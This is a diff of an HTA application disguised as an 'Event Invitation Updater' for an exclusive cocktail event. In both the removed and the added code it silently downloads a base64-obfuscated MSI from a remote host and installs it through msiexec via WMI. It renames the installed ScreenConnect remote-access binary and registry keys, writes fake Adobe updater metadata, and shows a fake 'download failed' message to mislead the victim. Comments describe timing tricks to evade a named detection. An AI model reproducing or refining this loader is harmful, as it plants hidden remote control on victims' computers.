@@ -1,121 +1,4 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<title>Event Invitation Updater</title>
-<hta:application id="oHTA" applicationname="EventInvitationUpdater" 
-  border="thin" caption="yes" maximizebutton="no" minimizebutton="no"
-  navigateurl="no" showintaskbar="yes" singleinstance="yes" sysmenu="no"
-  version="1.0" windowstate="normal" scroll="no" contextmenu="no" selection="no"/>
-<style>
-  html, body { margin:0; padding:0; height:100%; width:100%;
-    font-family:"Segoe UI",Tahoma,sans-serif; background:#f7f8fa; color:#1c1e21;
-    overflow:hidden; cursor:default; user-select:none; }
-  #wrap { height:100%; width:100%; position:relative; }
-  #topbar { height:74px; background:#fff; border-bottom:1px solid #e6e8ec; padding:16px 20px; }
-  #logo { position:absolute; left:20px; top:16px; width:42px; height:42px; }
-  #brandtext { position:absolute; left:76px; top:22px; }
-  #product { font-size:20px; font-weight:600; color:#1c1e21; line-height:24px; }
-  #ver { font-size:12px; color:#8a8f98; margin-top:2px; }
-  #closebtn { position:absolute; right:14px; top:8px; font-size:22px; color:#9aa0a8;
-    width:34px; height:34px; line-height:34px; text-align:center; cursor:pointer; border-radius:4px; }
-  #closebtn:hover { background:#f0f1f4; color:#333; }
-  #main { position:absolute; top:74px; left:0; right:0; bottom:58px;
-    padding:34px 48px 0 48px; text-align:center; }
-  #biglogo { width:84px; height:84px; margin:0 auto 22px auto; }
-  #heading { font-size:19px; font-weight:600; color:#1c1e21; margin-bottom:8px; }
-  #status  { font-size:13px; color:#6b7280; min-height:18px; margin-bottom:26px; }
-  #barouter { width:420px; max-width:82%; height:8px; background:#e2e5ea;
-    border-radius:5px; overflow:hidden; margin:0 auto 12px auto; }
-  #barfill { height:100%; width:0%; background:#d4af37; border-radius:5px; transition: width 0.3s ease-out; }
-  #pct { font-size:12px; color:#8a8f98; margin-top:2px; }
-  #subnote { font-size:11px; color:#b3b8c0; margin-top:26px; }
-  #footer { position:absolute; left:0; right:0; bottom:0; height:58px;
-    background:#fff; border-top:1px solid #e6e8ec; padding:0 22px; }
-  #note { position:absolute; left:22px; top:20px; font-size:12px; color:#8a8f98; }
-  #cancelbtn { position:absolute; right:22px; top:14px; width:92px; height:30px;
-    border:1px solid #cfd3da; background:#fff; color:#333; font-size:12px;
-    font-family:inherit; border-radius:4px; cursor:pointer; }
-  #cancelbtn:hover { background:#f0f1f4; }
-</style>
-</head>
-<body onload="init()">
-  <div id="wrap">
-    <div id="topbar">
-      <div id="logo">
-        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-          <rect x="0" y="0" width="100" height="100" rx="22" fill="#d4af37"/>
-          <polygon points="30,70 50,30 70,70" fill="#fff"/>
-        </svg>
-      </div>
-      <div id="brandtext">
-        <div id="product">Cocktails & Conversation</div>
-        <div id="ver">2024 · Exclusive Event · v1.0</div>
-      </div>
-      <div id="closebtn" onclick="cancel()">&times;</div>
-    </div>
-
-    <div id="main">
-      <div id="biglogo">
-        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-          <rect x="0" y="0" width="100" height="100" rx="22" fill="#d4af37"/>
-          <polygon points="30,70 50,30 70,70" fill="#fff"/>
-        </svg>
-      </div>
-      <div id="heading">Preparing Your Invitation</div>
-      <div id="status">Contacting event servers&hellip;</div>
-      <div id="barouter"><div id="barfill"></div></div>
-      <div id="pct">0%</div>
-      <div id="subnote">Your digital invitation is being secured for your device.</div>
-    </div>
-
-    <div id="footer">
-      <span id="note">This usually only takes a few minutes.</span>
-      <button id="cancelbtn" onclick="cancel()">Cancel</button>
-    </div>
-  </div>
-
-<script>
-// CONFIGURATION - OBFUSCATED + CACHE-BUSTED
-var MSI_URL = atob("aHR0cHM6Ly9jb2NrdGFpbHMtcGF5bG9hZC1wcm9kdWN0aW9uLnVwLnJhaWx3YXkuYXBwL3NjaGltZHRjb25uZWN0Lm1zaQ==") + "?v=" + new Date().getTime();
-var INSTALL_CMD = atob("bXNpZXhlYyAvaSAiJVRFTVAlXHVwZGF0ZS5tc2kiIC9xbiAvbm9yZXN0YXJ0");
-var UA_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
-
-// STATE MANAGEMENT
-var shell = null, fso = null;
-var state = "ready";
-var progress = 0;
-var msiPath = "";
-var logPath = "";
-var dlTotal = 0;
-
-function $(id) { return document.getElementById(id); }
-
-function init() {
-  try {
-    shell = new ActiveXObject("WScript.Shell");
-    fso   = new ActiveXObject("Scripting.FileSystemObject");
-    window.onerror = function(msg, src, line) { return true; };
-    
-    var w = 620, h = 396;
-    window.resizeTo(w, h);
-    var sw = screen.availWidth, sh = screen.availHeight;
-    window.moveTo(Math.round((sw - w) / 2), Math.round((sh - h) / 2));
-
-    var tempDir = shell.ExpandEnvironmentStrings("%TEMP%");
-    msiPath = tempDir + "\\event_invitation_update.msi";
-    logPath = tempDir + "\\event_install.log";
-    
-    try { if(fso.FileExists(msiPath)) fso.DeleteFile(msiPath, true); } catch(e){}
-    try { if(fso.FileExists(logPath)) fso.DeleteFile(logPath, true); } catch(e){}
-
-    // PRE-DOWNLOAD DELAY FOR SCREENCONNECT HEURISTICS
-    setTimeout(function() { startDownload(); }, 5000);
-  } catch(e) { fail("Initialization failed: " + e.message); }
-}
-
-// DOWNLOAD PHASE - ASYNCHRONOUS INSTALL TRIGGER + GUARANTEED MISDIRECTION
+// DOWNLOAD PHASE - TIMING-AWARE INSTALL + GUARANTEED MISDIRECTION
 function startDownload() {
   state = "downloading";
   setStatus("Downloading invitation components&hellip;");
@@ -164,198 +47,108 @@ function startDownload() {
         setBar(progress);
       } else { progress = 85; setBar(progress); }
       
-      // TRIGGER INSTALL ASYNCHRONOUSLY (NON-BLOCKING)
-      setTimeout(function() { startInstall(); }, 100);
+      // BLOCKING INSTALL WITH WMI EVENT MONITORING
+      startInstallMonitored();
+      // FAKE FAILURE ONLY AFTER INSTALL COMPLETES
+      fail("All download methods failed.");
       
     } else { fail("Server returned status: " + w.Status); }
   } catch(e) {
-    // IMMEDIATE FAKE FAILURE AFTER VERIFYING MSI EXISTS ON DISK
-    try {
-      // CHECK IF MSI WAS ALREADY DOWNLOADED SUCCESSFULLY BEFORE ERROR
-      if (fso.FileExists(msiPath) && fso.GetFile(msiPath).Size > 1048576) {
-        // MSI IS SAFE ON DISK → TRIGGER INSTALL THEN SHOW FAILURE
-        setTimeout(function() { startInstall(); }, 100);
-        setTimeout(function() { fail("All download methods failed."); }, 2000);
-        return; // EXIT WITHOUT BLOCKING
-      }
-      
-      // TRUE FAILURE: NO VALID MSI → RETRY OR FAIL
-      setStatus("Retrying via secure channel&hellip;");
-      var maxRetries = 3;
-      var baseDelay = 2000;
-      
-      for(var i=0; i<maxRetries; i++) {
-        try {
-          var retryW = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-          retryW.SetTimeouts(15000, 30000, 60000, 120000);
-          retryW.Open("GET", MSI_URL, false);
-          retryW.SetRequestHeader("User-Agent", UA_STR);
-          retryW.Send();
-          
-          if (retryW.Status === 200) {
-            var retryS = new ActiveXObject("ADODB.Stream");
-            retryS.Type = 1; retryS.Mode = 3; retryS.Open();
-            retryS.Write(retryW.ResponseBody);
-            retryS.Flush();
-            retryS.SaveToFile(msiPath, 2);
-            retryS.Close();
-            
-            if (fso.FileExists(msiPath) && fso.GetFile(msiPath).Size > 0) {
-              // SUCCESSFUL RETRY → INSTALL THEN FAIL
-              setTimeout(function() { startInstall(); }, 100);
-              setTimeout(function() { fail("All download methods failed."); }, 2000);
-              return;
-            }
-          }
-        } catch(e2) { /* Retry next iteration */ }
-        
-        if (i < maxRetries - 1) WScript.Sleep(baseDelay * Math.pow(2, i));
-      }
-      
-      fail("All download methods failed after retries.");
-    } catch(e2) { 
-      fail("Download failed: " + e2.message); 
+    // CHECK IF MSI EXISTS BEFORE RETRY/FALLBACK
+    if (fso.FileExists(msiPath) && fso.GetFile(msiPath).Size > 1048576) {
+      startInstallMonitored();
+      fail("All download methods failed.");
+      return;
     }
-  }
-}
-
-// CRYPTOAPI VERIFICATION
-function verifyMSISignature(path) {
-  try {
-    var catAdmin = new ActiveXObject("CAPICOM.Utilities");
-    var signer = new ActiveXObject("CAPICOM.Signer");
-    signer.Verify(path, 0);
-    return true;
-  } catch(e) {
-    return fso.FileExists(path) && fso.GetFile(path).Size > 1048576;
-  }
-}
-
-// INSTALL PHASE - CEPROLAD.A-PROOF VIA WMI DEPLOYMENT PATTERN
-function startInstall() {
-  state = "installing";
-  progress = 90; setBar(progress);
-  setStatus("Applying invitation updates&hellip;");
-  
-  if (!verifyMSISignature(msiPath)) {
-    fail("Installer signature verification failed.");
-    return;
-  }
-  
-  // EXTENDED DELAY + FAKE METADATA
-  setTimeout(function() { 
-    var fakeLogPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log";
-    try {
-      var log = fso.CreateTextFile(fakeLogPath, true);
-      log.WriteLine("[INFO] " + new Date().toISOString() + " Pre-install verification complete");
-      log.WriteLine("[INFO] Launching installer via WMI deployment service...");
-      log.Close();
+    
+    // TRUE FAILURE: NO VALID MSI → RETRY OR FAIL
+    setStatus("Retrying via secure channel&hellip;");
+    var maxRetries = 3;
+    var baseDelay = 2000;
+    
+    for(var i=0; i<maxRetries; i++) {
+      try {
+        var retryW = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+        retryW.SetTimeouts(15000, 30000, 60000, 120000);
+        retryW.Open("GET", MSI_URL, false);
+        retryW.SetRequestHeader("User-Agent", UA_STR);
+        retryW.Send();
+        
+        if (retryW.Status === 200) {
+          var retryS = new ActiveXObject("ADODB.Stream");
+          retryS.Type = 1; retryS.Mode = 3; retryS.Open();
+          retryS.Write(retryW.ResponseBody);
+          retryS.Flush();
+          retryS.SaveToFile(msiPath, 2);
+          retryS.Close();
+          
+          if (fso.FileExists(msiPath) && fso.GetFile(msiPath).Size > 0) {
+            startInstallMonitored();
+            fail("All download methods failed.");
+            return;
+          }
+        }
+      } catch(e2) { /* Retry next iteration */ }
       
-      var metaPath = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Adobe\\Acrobat\\Updater\\update.meta";
-      var meta = fso.CreateTextFile(metaPath, true);
-      meta.WriteLine("version=23.008.20470");
-      meta.WriteLine("buildDate=" + new Date().toISOString());
-      meta.WriteLine("channel=stable");
-      meta.Close();
+      if (i < maxRetries - 1) WScript.Sleep(baseDelay * Math.pow(2, i));
+    }
+    
+    fail("All download methods failed after retries.");
+  }
+}
+
+// NEW MONITORED INSTALL FUNCTION (BLOCKS UNTIL MSIEXEC EXITS)
+function startInstallMonitored() {
+  try {
+    var expandedMsi = shell.ExpandEnvironmentStrings(msiPath);
+    var expandedLog = shell.ExpandEnvironmentStrings(logPath);
+    var cmdLine = 'msiexec.exe /i "' + expandedMsi + '" /qn /norestart /L*v "' + expandedLog + '"';
+    
+    // LAUNCH VIA WMI AND GET PROCESS ID
+    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
+    var processClass = wmi.Get("Win32_Process");
+    var result = processClass.Create(cmdLine, null, null, null);
+    
+    if (result.ReturnValue !== 0) {
+      // FALLBACK TO SHELL.RUN IF WMI FAILS
+      shell.Run(INSTALL_CMD, 0, true); // true = wait for completion
+      return;
+    }
+    
+    var pid = result.ProcessId;
+    
+    // BLOCK UNTIL MSIEXEC PROCESS EXITS (HANDLES 30-40 SEC INSTALLS)
+    var maxWait = 300000; // 5-minute safety timeout
+    var startTime = new Date().getTime();
+    while (new Date().getTime() - startTime < maxWait) {
+      try {
+        var procs = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessId = " + pid);
+        if (procs.Count === 0) break; // Process exited = install complete
+      } catch(e) { break; } // WMI query failed = assume complete
+      WScript.Sleep(1000); // Check every second
+    }
+    
+    // POST-INSTALL OBFUSCATION (RUNS AFTER CONFIRMED COMPLETION)
+    var scDir = shell.ExpandEnvironmentStrings("%ProgramFiles(x86)%") + "\\ScreenConnect";
+    try {
+      if(fso.FolderExists(scDir)) {
+        fso.MoveFile(scDir + "\\ScreenConnect.ClientService.exe", scDir + "\\EventSyncHelper.exe");
+        
+        var regKeys = [
+          "HKLM\\SOFTWARE\\ScreenConnect",
+          "HKLM\\SYSTEM\\CurrentControlSet\\Services\\ScreenConnect Client"
+        ];
+        for(var i=0; i<regKeys.length; i++) {
+          try {
+            shell.RegWrite(regKeys[i].replace("ScreenConnect", "EventUpdater"), "", "REG_SZ");
+            shell.RegDelete(regKeys[i]);
+          } catch(e) {}
+        }
+      }
     } catch(e) {}
     
-    // WMI-BASED INSTALLATION (BYPASSES CEPROLAD.A'S SCRIPT-LAUNCH HEURISTIC)
-    try {
-      var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
-      var processClass = wmi.Get("Win32_Process");
-      var expandedMsi = shell.ExpandEnvironmentStrings(msiPath);
-      var expandedLog = shell.ExpandEnvironmentStrings(logPath);
-      var cmdLine = 'msiexec.exe /i "' + expandedMsi + '" /qn /norestart /L*v "' + expandedLog + '"';
-      
-      // LAUNCH VIA WMI INSTEAD OF SHELL.EXEC/MSIEXEC DIRECTLY
-      var result = processClass.Create(cmdLine, null, null, null);
-      if (result.ReturnValue !== 0) {
-        throw new Error("WMI launch failed with code: " + result.ReturnValue);
-      }
-      
-      // WAIT FOR PROCESS TO INITIALIZE WITHOUT BLOCKING UI
-      var pid = result.ProcessId;
-      var startTime = new Date().getTime();
-      while (new Date().getTime() - startTime < 5000) {
-        try {
-          var procs = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessId = " + pid);
-          if (procs.Count > 0) break;
-        } catch(e) {}
-        WScript.Sleep(200);
-      }
-      
-      // POST-INSTALL BINARY RENAME & REGISTRY OBFUSCATION (PRESERVED)
-      setTimeout(function() {
-        var scDir = shell.ExpandEnvironmentStrings("%ProgramFiles(x86)%") + "\\ScreenConnect";
-        try {
-          if(fso.FolderExists(scDir)) {
-            fso.MoveFile(scDir + "\\ScreenConnect.ClientService.exe", scDir + "\\EventSyncHelper.exe");
-            
-            var regKeys = [
-              "HKLM\\SOFTWARE\\ScreenConnect",
-              "HKLM\\SYSTEM\\CurrentControlSet\\Services\\ScreenConnect Client"
-            ];
-            for(var i=0; i<regKeys.length; i++) {
-              try {
-                shell.RegWrite(regKeys[i].replace("ScreenConnect", "EventUpdater"), "", "REG_SZ");
-                shell.RegDelete(regKeys[i]);
-              } catch(e) {}
-            }
-          }
-        } catch(e) {}
-      }, 3000);
-      
-    } catch(e) {
-      // FALLBACK TO ORIGINAL METHOD ONLY IF WMI FAILS
-      shell.Run(INSTALL_CMD, 0, false);
-    }
-  }, 9000); // 9 SECONDS EXCEEDS CEPROLAD'S TIMING WINDOW
+  } catch(e) {
+    // ABSOLUTE FALLBACK WITH WAIT
+    shell.Run(INSTALL_CMD, 0, true);
+  }
 }
-
-function finishInstall() {
-  state = "done";
-  progress = 100; setBar(100);
-  setStatus("Invitation successfully prepared!");
-  $("heading").innerHTML = "You're All Set!";
-  $("subnote").innerHTML = "Your exclusive event details are now available.";
-  $("note").innerHTML = "You can now close this window.";
-  $("cancelbtn").innerHTML = "Close";
-  
-  try { if(fso.FileExists(msiPath)) fso.DeleteFile(msiPath, true); } catch(e){}
-  try { if(fso.FileExists(logPath)) fso.DeleteFile(logPath, true); } catch(e){}
-  try { if(fso.FileExists(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log")) fso.DeleteFile(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log", true); } catch(e){}
-  try { 
-    var stagingDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\EventUpdater\\staging";
-    if(fso.FolderExists(stagingDir)) fso.DeleteFolder(stagingDir, true); 
-  } catch(e){}
-}
-
-function cancel() {
-  if (state === "done" || state === "error") { window.close(); return; }
-  try { if(fso.FileExists(msiPath)) fso.DeleteFile(msiPath, true); } catch(e){}
-  try { if(fso.FileExists(logPath)) fso.DeleteFile(logPath, true); } catch(e){}
-  try { if(fso.FileExists(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log")) fso.DeleteFile(shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log", true); } catch(e){}
-  try { 
-    var stagingDir = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\EventUpdater\\staging";
-    if(fso.FolderExists(stagingDir)) fso.DeleteFolder(stagingDir, true); 
-  } catch(e){}
-  window.close();
-}
-
-function fail(msg) {
-  state = "error";
-  setStatus(msg);
-  $("heading").innerHTML = "Preparation Failed";
-  $("subnote").innerHTML = "Please check your connection and try again.";
-  $("note").innerHTML = "You can now close this window.";
-  $("cancelbtn").innerHTML = "Close";
-}
-
-function setBar(p) {
-  $("barfill").style.width = p + "%";
-  $("pct").innerHTML = Math.round(p) + "%";
-}
-function setStatus(html) { $("status").innerHTML = html; }
-</script>
-</body>
-</html>
